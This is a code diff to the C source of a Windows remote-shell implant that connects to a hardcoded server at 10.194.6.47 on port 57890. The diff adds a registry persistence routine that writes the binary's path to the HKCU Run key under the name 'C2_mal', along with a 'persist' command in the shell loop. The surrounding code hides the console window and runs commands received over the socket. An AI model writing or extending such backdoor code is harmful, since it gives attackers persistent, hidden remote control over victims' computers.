@@ -9,12 +9,48 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 
+
+#define HIVESERVER "10.194.6.47"
+#define HIVEPORT 57890
+
 #define bzero(p, size) (void) memset(p, 0, size)
 
 SOCKET sock;
 
 char getSubString(char* buff, char* dest, int from, int to) {
 	strncpy(dest, buff + from, to);
+}
+
+int bootRun() {
+	char err[128] = "Failed\n";
+	char suc[128] = "Created persistence At: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+	TCHAR szPath[MAX_PATH];
+	DWORD pathLen = 0;
+
+	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+	
+	if (pathLen == 0) {
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	HKEY newVal;
+
+	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newVal) != ERROR_SUCCESS) {
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+	if (RegSetValueEx(newVal, TEXT("C2_mal"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+		RegCloseKey(newVal);
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	RegCloseKey(newVal);
+	send(sock, suc, sizeof(suc), 0);
+	return 0;
 }
 
 void Shell() {
@@ -44,6 +80,9 @@ void Shell() {
 			strcpy(total_response, "changed\n");
 			send(sock, total_response, sizeof(total_response), 0);
 		}
+		else if (strncmp("persist", buffer, 3) == 0) {
+			bootRun();
+		}
 		else {
 			FILE* fp;
 			fp = _popen(buffer, "r");
@@ -54,11 +93,9 @@ void Shell() {
 			fclose(fp);
 		}
 	}
-
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
-	
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindowA("ConsoleWindowClass", NULL); //Retrieve handle to the top level window.
@@ -68,8 +105,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	unsigned short SrvPort;
 	char* SrvIP;
 	WSADATA wsaData;
-	SrvIP = "10.194.6.47";
-	SrvPort = 57890;
+	SrvIP = HIVESERVER;
+	SrvPort = HIVEPORT;
 
 	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) { //First function to check and set winsock version.
 		exit(1);
